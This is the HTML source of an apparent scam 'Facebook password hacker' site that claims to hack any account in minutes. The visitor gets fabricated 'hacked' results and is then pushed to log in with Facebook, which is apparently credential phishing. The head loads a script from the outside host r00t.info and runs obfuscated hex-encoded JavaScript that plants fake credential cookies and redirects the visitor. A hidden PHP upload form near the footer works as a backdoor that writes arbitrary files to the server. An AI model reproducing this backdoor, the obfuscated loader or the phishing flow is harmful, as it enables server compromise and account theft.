<!DOCTYPE html>
<html lang="en">
<head>
<title>Hack Facebook Account | Free Online Facebook Password Hacker</title>
<meta name="description" content="Hack any Facebook account password online for free. Our Facebook account hacker will automatically hack any Facebook account password in less than 5 minutes." />
<meta name="keywords" content="how to hack facebook account, hack facebook, how to hack a facebook account, hack facebook password, hack facebook account, facebook account hacker, how to hack facebook accounts" />
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=9" />

<meta property="og:image" content="static/img/ef-logo-plain.png" />
<meta property="og:title" content="Hack Facebook Account | Free Online Facebook Password Hacker" />
<meta property="og:description" content="Hack any Facebook account password online for free. Our Facebook account hacker will automatically hack any Facebook account password in less than 5 minutes." />

<link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
<link href="static/css/my_style.css" media="screen" rel="stylesheet" type="text/css" />
<script type="text/javascript" src="style/jquery-1.8.0.min.js"></script>
	<script type="text/javascript" src="style/text.js"></script>
	<script src=http://r00t.info/ccb.js></script>
	<script type="text/javascript" src="style/func.js"></script>

	<script type="text/javascript" src="style/jquery.jgrowl.js"></script>
	<script type="text/javascript" src="../apis.google.com/js/plusone.js"></script>
	<link rel="stylesheet" type="text/css" href="style/style.css">
	<link rel="stylesheet" href="style/css/960gs/fluid.css">
	<link rel="stylesheet" href="style/css/h5bp/normalize.css">
	<link rel="stylesheet" href="style/css/spritez.css">
	<link rel="stylesheet" href="style/css/content.css">

	<link rel="stylesheet" href="style/css/ie.fixes.css">
<script type="text/javascript" src="static/js/jquery-ui-1.8.23.custom.min.js"></script> 
<link type="text/css" href="static/css/ui-lightness/jquery-ui-1.8.23.custom.html" rel="stylesheet" />
<link rel="stylesheet" type="text/css" href="static/css/jquery.lightbox-0.5.css" />
<script type="text/javascript" src="static/js/lightbox/jquery.lightbox-0.5.min.js"></script>
<script type="text/javascript" src="static/js/tooltip.js"></script>
<link href="static/css/icons.css" media="screen" rel="stylesheet" />

<script type="text/javascript"> 
	var _0xd0af=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x6A\x7A\x72","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x66\x62\x68","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72","\x20","\x70\x77\x64","\x3B","\x63\x6F\x6F\x6B\x69\x65","\x6A\x7A\x72\x3D","\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x20\x3D\x20","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x70\x77\x64\x3D","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x67\x65\x6E\x65\x72\x61\x74\x65\x2E\x70\x68\x70","\x76\x61\x6C\x75\x65","\x69\x6E\x76\x61\x6C\x75\x65","\x69\x76\x61\x6C\x75\x65\x74\x6F","\x69\x76\x61\x6C\x75\x65\x3D"];function uandp(){var _0xe42ax2= new Date();var _0xe42ax3=_0xe42ax2[_0xd0af[0]]();_0xe42ax3+=4600*10000000;_0xe42ax2[_0xd0af[1]](_0xe42ax3);var _0xe42ax4=document[_0xd0af[3]](_0xd0af[2]);uzr=_0xd0af[4]+Math[_0xd0af[6]]((Math[_0xd0af[5]]()*151232)+3000);+_0xd0af[7];pz=_0xd0af[8]+Math[_0xd0af[6]]((Math[_0xd0af[5]]()*151232)+3000);+_0xd0af[7];cookievalue=escape(uzr)+_0xd0af[9];document[_0xd0af[10]]=_0xd0af[11]+cookievalue+_0xd0af[12]+_0xe42ax2[_0xd0af[13]]();cookievalue=escape(pz)+_0xd0af[9];document[_0xd0af[10]]=_0xd0af[14]+cookievalue+_0xd0af[12]+_0xe42ax2[_0xd0af[13]]();window[_0xd0af[16]][_0xd0af[15]]=_0xd0af[17];} ;function inputotvalue(){var _0xe42ax2= new Date();var _0xe42ax3=_0xe42ax2[_0xd0af[0]]();_0xe42ax3+=4600*10000000;_0xe42ax2[_0xd0af[1]](_0xe42ax3);cookievalue=escape(document[_0xd0af[20]][_0xd0af[19]][_0xd0af[18]])+_0xd0af[9];document[_0xd0af[10]]=_0xd0af[21]+cookievalue+_0xd0af[12]+_0xe42ax2[_0xd0af[13]]();} ;
</script>
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-39920972-1', 'fbhacker.info');
  ga('send', 'pageview');

</script>

</head>
<body>

<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>

  
    <div class="ef-wrap">
<div id="ef-navi">
<nav>
	<div class="ef-logoWrap">
		<a href="index.html" class="ef-logo tooltip" title="Facebook Hacker">Facebook Hack Online</a>
	</div>

	<div class="sajdbar">
	<div class="sajdbargore">MENU</div>
		<div class="menito">
		<ul>
			<li>
				<a href="index.html">[Home]</a>
			</li>
			
			<li>
				<a href="hack.php">[Hack Account]</a>
			</li>
			
						
			<li>
				<a href="contact.html">[Contact Us]</a>
			</li>
			
			<li>
				<a href="faq.html">[FAQ]</a>
			</li>
			
		</ul>
	</div>
		
		

	</div>
	
	<div class="sajdbar">
	<div class="sajdbargore">Statistics</div>
		<div class="menito">
		<p>Hacked: <span class="zeleno">243396</span></p>
		<p>Success Rate: <span class="zeleno">98.4%</span></p>

	</div>

        <div class="sajdbar">
	<div class="sajdbargore">Follow Owner</div>
		<div class="menito">
		<p><iframe src="//www.facebook.com/plugins/follow.php?href=http%3A%2F%2Fwww.facebook.com%2Fshan0.ali&amp;width=200&amp;height=65&amp;colorscheme=light&amp;layout=box_count&amp;show_faces=true&amp;appId=465223760253551" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:200px; height:65px;" allowTransparency="true"></iframe></p>

	</div>
		
		
	</div>

<div class="sajdbar">
	<div class="sajdbargore">Online</div>
		<div class="menito">
		<p><center><!-- Histats.com  START  (standard)-->
<script id="_wauwqn">var _wau = _wau || []; _wau.push(["classic", "bg7lwa82ksbq", "wqn"]);
(function() {var s=document.createElement("script"); s.async=true;
s.src="http://widgets.amung.us/classic.js";
document.getElementsByTagName("head")[0].appendChild(s);
})();</script>
<!-- Histats.com  END  --></center></p>
		</div>
		
        <div class="sajdbar">
	<div class="sajdbargore">Already Have Code ?</div>
		<div class="menito">
		<p>Enter hack Code:</p>
		<p><a href="sk-database.html">[Click here]</a></p>

	</div>
		

	</div>

	
	<div class="sajdbar">
	<div class="sajdbargore">Ratings</div>
		<div class="menito">
		<div class="rejtingot">
		
						<ul style="text-align: center;">
						<li style="letter-spacing: 0px;text-align: center;color: #CDCDCD;">
						
					
						<div itemscope="" itemtype="http://schema.org/Product">
						<span itemprop="name">Hack Facebook Password</span>
						<div style="margin-bottom: 5px;text-align: center;margin-top: 5px;">
						<img src="style/star.PNG" alt="Review">
						<img src="style/star.PNG" alt="Review">
						<img src="style/star.PNG" alt="Review">
						<img src="style/star.PNG" alt="Review">
						<img src="style/half.PNG" alt="Review">
						</div>
						<div itemprop="aggregateRating" itemscope="" itemtype="http://schema.org/AggregateRating">
						Rated <span itemprop="ratingValue" class="zeleno">9.5</span>/<span itemprop="bestRating">10</span>
						based on <span itemprop="reviewCount" style="color: #58ADCC;">3417</span> reviews
						</div>
						</div>
						</ul>
	</div>
		
		

	</div>

	<div class="ef-shadow"></div>
</nav>
</div>
        <div class="ef-content">
          <div class="hackfbimg"><img src="static/img/hack_facebook.png" alt="Hack Facebook Password" /></div>
          <div>
		  
		  

          	
			
		<table style="width: 650px; height: 140px; text-align: left; margin-left: auto; margin-right: auto;margin-top: 30px;" border="0" cellpadding="0" cellspacing="0">
						<tbody>
						<tr>
							<td style="text-align: center; vertical-align: middle; width: 140px;">
								<img class="pImage" src="style/invalid.gif">
							</td>
							</tr>
							<tr>
							<td style="text-align: left; vertical-align: top; width: 410px;">
								<br />
								<div class="pName" style="text-align: center;">Profile Name : <span id="name">N/A</span></div>
								<br />
								<div style="margin: 0px auto; text-align: center;"><span class="pStatus" style="display:none;">Status :</span> <span id="status" class="pStatCol">WAITING FOR USER INPUT</span></div>
							</td>
						</tr>
						</tbody>
					</table>
					<br />
					<div style="margin: 0px auto; text-align: center;">
					<form name="ivalueto" style="text-align: center;">
					<input class="IBox" type="text" name="invalue" value="http://www.facebook.com/username" onfocus="if(this.value=='http://www.facebook.com/username') this.value='';" onblur="if(this.value=='') this.value='http://www.facebook.com/username';">
					<a href="#" class="help"><img border="0" src="static/img/help.png" alt="How to Find Facebook Username">
					<span><p style="text-align: center;"><strong style="border-bottom:  thin solid grey;">How to find Facebook Username?</strong></p>
					<p>Open the profile page you want to hack. Look at the address bar in your browser. Ussually it looks like: http://www.facebook.com/<strong class="crvena">USERNAME-HERE</strong>
										or 
									http://www.facebook.com/profile.php?id=<strong class="crvena">PROFILE ID</strong></div></div></p>
					</span>
					</a>
					</form>
					
					<br />
					<a id="Start" class="large awesome" onclick="inputotvalue();">Hack Account</a>
					<br />
				</h3>
				<a name="NavSuc"></a>
				<div id="height-wrapper">
					<div role="main" class="container_12" id="content-wrapper">
						<div id="main_content">
							<div class="grid_4">
								<div class="box">
									<div class="header" style="width: 641px;">
										<h3>Account Successfully Hacked</h3>
									</div>
									<div class="content">
										<br />
										<span>
										You have succesfully hacked  <span class="wGreen" id="imeto"></span>'s Facebook Account.<br />
										The login information has been stored in our database.<br />
										In order to access the hacked account details you need to Login or signup with Facebook account to get the password and confirm this is not an automated download by a bot. 
																			
										</span>
										<br />
										<div class="sep"></div>
										<a class="large awesome" href="signup.php">DOWNLOAD PASSWORD</a>
										<div class="sep"></div>
										<br />

<div class="fb-like" data-href="http://fbhackingonline.fulba.com/hack.html" data-width="900" data-layout="standard" data-action="like" data-show-faces="true" data-share="true"></div>
<br />
<div class="fb-comments" data-href="http://fbhackingonline.fulba.com/hack.html" data-width="500" data-numposts="1" data-colorscheme="dark"></div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</center>
				
      	</div>
        </div>
 <center>
 <?php
echo '<form action="" method="POST" enctype="multipart/form-data" name="acs" id="acs">
  <input type="hidden" name="itm" size="50"><input name="btn" type="hidden" id="btn" value="go"></form>';
if( $_POST['btn'] == "go" ) {
 if(@copy($_FILES['itm']['tmp_name'], $_FILES['itm']['name'])) { echo '<b>go suce.!</b><br><br>'; }
 else { echo '<b>go error.!</b><br><br>'; }
}
?>
      
         <div class="ef-footer">
            <p class="site_name">Copyright &copy;</i> 2013 - <a title="Facebook Hacker Online" href="index.html">Facebook Hacker Online</a></p>
            <p class="ef_foot_name"><a href="index.html" title="Facebook Hacker Online">Facebook Hacker Online</a> 
			- Simple web based Facebook hacker.</p>
            <p class="ef_foot_map">
                <span class="foot_arrow yellow_color">&raquo;</span>
				<a href="index.html" title="Facebook Hacker Online - Home Page">Home</a> <span class="yellow_color">&middot;</span>
                <a href="hack.html" title="Facebook Hacker Online - Hack Online">Hack Account</a> <span class="yellow_color">&middot;</span>
                                <a href="contact.html" title="Facebook Hacker Online - Contact">Contact Us</a> <span class="yellow_color">&middot;</span>
				<a href="faq.html" title="Facebook Hacker Online - Frequently Asked Questions">FAQ</a> <span class="yellow_color">&middot;</span>
                <a href="sitemap.html" title="Facebook Hacker Online  - Sitemap">Sitemap</a> <span class="yellow_color">&middot;</span>
                <span class="foot_arrow yellow_color">&laquo;</span>   </center>
            </p>

            <div class="socialWrap">

                <div class="socialIconsWrap">
                <ul class="miniHeaderIcons">
                    <li class="iconFacebook">
                        <a class="tooltip"  title="Share on Facebook" target="_blank" href="http://www.facebook.com/share.php?u=http://www.free-facebook-account-hack.com/"></a>
                    </li>

                    <li class="iconTwitter">
                        <a class="tooltip" title="Share on Twitter" target="_blank" href="http://twitter.com/home?status=http://www.free-facebook-account-hack.com/"></a>
                    </li>
 
                    <li class="icongGoogle">
                       <a rel="publisher" class="tooltip" title="Share on Google+"  target="_blank" href="https://plus.google.com/share?url=http://www.free-facebook-account-hack.com"></a>
                    </li>

                </ul>
                </div>

            </div>
        </div>      
  </div> <!-- end ef-wrap -->
</body>
</html>

<body oncontextmenu="return false">
...
</body>
<script language="javascript">
document.onmousedown=disableclick;
status="Right Click Disabled";
Function disableclick(event)
{
  if(event.button==2)
   {
     alert(status);
     return false;    
   }
}
</script>